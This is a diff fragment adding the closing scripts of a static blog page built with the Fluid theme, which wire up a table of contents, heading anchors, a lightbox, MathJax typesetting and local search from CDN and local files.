+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Please enable JavaScript to render the matrix.</div>
+  </noscript>
+</body>
+</html>
